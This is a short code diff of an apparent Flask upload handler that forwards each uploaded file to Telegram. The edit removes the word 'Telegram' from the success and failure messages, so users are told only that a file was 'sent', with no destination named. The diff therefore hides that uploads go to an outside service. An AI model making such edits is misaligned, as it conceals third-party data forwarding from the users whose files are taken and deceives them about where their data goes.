@@ -33,9 +33,9 @@ def index():
 
                 telegram_response = send_file_to_telegram(save_path, file.filename)
                 if telegram_response.get("ok"):
-                    flash("File uploaded and sent to Telegram successfully!", "success")
+                    flash("File uploaded and sent successfully!", "success")
                 else:
-                    flash("File uploaded but failed to send to Telegram.", "error")
+                    flash("File uploaded but failed to send .", "error")
 
                 return redirect("/")
         if "password" in request.form:
